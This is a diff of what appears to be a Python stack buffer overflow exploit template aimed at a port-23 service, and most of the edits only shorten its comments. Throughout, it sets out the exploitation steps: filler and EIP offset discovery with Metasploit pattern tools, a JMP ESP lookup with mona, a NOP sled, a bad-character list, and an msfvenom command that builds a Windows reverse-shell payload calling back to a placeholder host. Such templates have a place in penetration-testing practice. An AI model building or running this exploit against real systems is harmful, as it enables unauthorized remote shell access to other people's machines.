@@ -7,14 +7,14 @@ port = 23     #/// REQUIRED
 # u can use fuzzer but 3000 is usually enought
 offset = 3000
 filler = "A" * offset
-# generate patern with command:     msf-pattern_create -l 3000
-# and replace filler
-# to check offset to eip use:       msf-pattern_offset -l 3000 -q <eip adress>
-# and update offset
+# generate patern:     msf-pattern_create -l 3000
+# replace filler
+# check offset to eip:       msf-pattern_offset -l 3000 -q <eip adress>
+# update offset
 eip = "BBBB"
 # if eip is \x42\x42\x42\x42 u are in right spot
 # in debuger use                    !mona find -s "\xff\xe4"
-# to find JMP ESP adress
+# find JMP ESP adress
 # update eip with revesed JMPESP adress
 # EXAMPLE     jmpesp 77D34E5B    eip = "\x5B\x4E\xD3\x77"
 nops = "\x90" * 16
@@ -29,8 +29,8 @@ nops = "\x90" * 16
 #     "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
 #     "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
-# generate payload using            msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<ListeningPort> -b "\x00\xBAD\xCH\xARS" -f python
-# and paste below
+# generate payload            msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<ListeningPort> -b "\x00\xBAD\xCH\xARS" -f python
+# paste below
 buf = ""
 
 # \\\\\\\\ COMMENT/UNCOMMENT WHAT U NEED /////////////
